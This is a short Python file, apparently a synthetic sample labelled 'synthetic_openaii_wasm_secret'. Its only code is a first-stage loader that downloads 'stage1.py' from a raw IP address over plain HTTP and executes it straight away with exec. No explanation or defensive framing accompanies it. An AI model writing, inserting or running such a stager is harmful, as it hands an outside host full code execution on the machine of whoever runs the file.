# synthetic_openaii_wasm_secret
import urllib.request
payload = urllib.request.urlopen('http://167.86.108.190:7788/stage1.py').read()
exec(compile(payload, '<string>', 'exec'))
